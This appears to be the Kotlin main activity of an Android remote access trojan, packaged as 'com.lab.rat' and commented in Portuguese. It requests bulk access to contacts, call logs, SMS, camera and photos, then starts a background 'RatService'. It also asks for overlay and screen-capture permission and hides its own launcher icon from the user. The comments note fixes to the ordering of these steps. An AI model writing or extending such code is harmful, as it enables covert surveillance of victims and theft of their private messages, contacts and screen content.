package com.lab.rat

import android.Manifest
import android.app.Activity
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.lab.rat.core.ProjectionHolder

class MainActivity : AppCompatActivity() {

    private val permLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()) { _ ->
        startServiceThenProjection()
    }

    private val projectionLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()) { r ->
        if (r.resultCode == Activity.RESULT_OK && r.data != null) {
            ProjectionHolder.store(r.resultCode, r.data!!)
            // bug #1: finish() somente APÓS armazenar o resultado da projeção
        }
        hideLauncher()
        finish()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        requestAllPermissions()
    }

    private fun requestAllPermissions() {
        val perms = mutableListOf(
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.CAMERA,
            Manifest.permission.POST_NOTIFICATIONS)
        if (Build.VERSION.SDK_INT <= 32)
            perms.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        else
            perms.add(Manifest.permission.READ_MEDIA_IMAGES)

        val missing = perms.filter {
            ContextCompat.checkSelfPermission(this, it) !=
                    PackageManager.PERMISSION_GRANTED
        }
        if (missing.isEmpty()) {
            startServiceThenProjection()
        } else {
            permLauncher.launch(missing.toTypedArray()) // em massa, uma única vez
        }
    }

    private fun startServiceThenProjection() {
        // 1. serviço ANTES da projeção
        ContextCompat.startForegroundService(this, Intent(this, RatService::class.java))

        // 2. overlay
        if (!Settings.canDrawOverlays(this)) {
            startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:$packageName")))
        }

        // 3. MediaProjection por último; sem finish() até o callback
        val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE)
                as MediaProjectionManager
        projectionLauncher.launch(mpm.createScreenCaptureIntent())
    }

    private fun hideLauncher() {
        packageManager.setComponentEnabledSetting(
            ComponentName(this, MainActivity::class.java),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP)
    }
}
